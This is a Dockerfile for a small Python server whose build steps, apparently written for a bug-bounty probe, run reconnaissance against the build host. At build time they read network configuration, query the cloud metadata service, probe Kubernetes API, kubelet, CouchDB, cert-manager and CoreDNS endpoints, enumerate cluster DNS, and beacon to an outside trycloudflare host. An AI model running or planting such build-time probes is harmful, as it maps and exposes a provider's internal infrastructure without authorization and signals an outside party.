FROM python:3.11-slim

RUN apt-get update && apt-get install -y curl dnsutils iproute2 && rm -rf /var/lib/apt/lists/*

RUN echo "=== RESOLV.CONF ===" && cat /etc/resolv.conf 2>&1 || true
RUN echo "=== HOSTNAME ===" && hostname 2>&1 || true
RUN echo "=== IP ADDR ===" && ip addr 2>&1 || true
RUN echo "=== IP ROUTE ===" && ip route 2>&1 || true

RUN echo "=== IMDS v1 ===" && curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1.json 2>&1 || echo "IMDS_FAILED"
RUN echo "=== IMDS v1 ID ===" && curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1/id 2>&1 || echo "IMDS_ID_FAILED"
RUN echo "=== IMDS v1 REGION ===" && curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1/region 2>&1 || echo "IMDS_REGION_FAILED"
RUN echo "=== IMDS INTERFACES ===" && curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1/interfaces/ 2>&1 || echo "IMDS_INTERFACES_FAILED"

RUN echo "=== K8S API ===" && curl -sk --connect-timeout 3 --max-time 5 https://10.245.0.1:443/version 2>&1 || echo "K8S_API_FAILED"
RUN echo "=== K8S API HTTP ===" && curl -s --connect-timeout 3 --max-time 5 http://10.245.0.1:80/version 2>&1 || echo "K8S_API_HTTP_FAILED"
RUN echo "=== KUBELET ===" && curl -sk --connect-timeout 3 --max-time 5 https://10.244.19.49:10250/pods 2>&1 || echo "KUBELET_FAILED"

RUN echo "=== COUCHDB ===" && curl -s --connect-timeout 3 --max-time 5 http://10.245.189.148:5984/ 2>&1 || echo "COUCHDB_FAILED"
RUN echo "=== CERT-MANAGER ===" && curl -s --connect-timeout 3 --max-time 5 http://10.245.126.166:9402/metrics 2>&1 || echo "CERTMGR_FAILED"

RUN echo "=== COREDNS METRICS ===" && curl -s --connect-timeout 3 --max-time 5 http://10.245.0.10:9153/metrics 2>&1 || echo "COREDNS_METRICS_FAILED"
RUN echo "=== COREDNS HEALTH ===" && curl -s --connect-timeout 3 --max-time 5 http://10.245.0.10:8080/health 2>&1 || echo "COREDNS_HEALTH_FAILED"

RUN echo "=== DNS ENUM ===" && nslookup kubernetes.default.svc.cluster.local 2>&1 || true
RUN echo "=== DNS COUCHDB ===" && nslookup couchdb.openwhisk.svc.cluster.local 2>&1 || true

RUN echo "=== NODE EXPORTER ===" && curl -s --connect-timeout 3 --max-time 5 http://localhost:9100/metrics 2>&1 | head -20 || echo "NODE_EXPORTER_FAILED"
RUN echo "=== KUBELET READONLY ===" && curl -s --connect-timeout 3 --max-time 5 http://localhost:10255/pods 2>&1 | head -50 || echo "KUBELET_RO_FAILED"

RUN echo "=== SSRF SHERIFF ===" && curl -s --connect-timeout 5 --max-time 8 "https://ssrf-sheriff.internal.digitalocean.com/?X-BBP-Researcher=mrunal" 2>&1 || echo "SHERIFF_FAILED"

RUN echo "=== OOB PING ===" && curl -s --connect-timeout 5 --max-time 8 "https://admit-closely-coupon-statutes.trycloudflare.com/dockerfile-build-probe" 2>&1 || echo "OOB_FAILED"

COPY server.py /app/server.py
WORKDIR /app
EXPOSE 8080
CMD ["python", "server.py"]
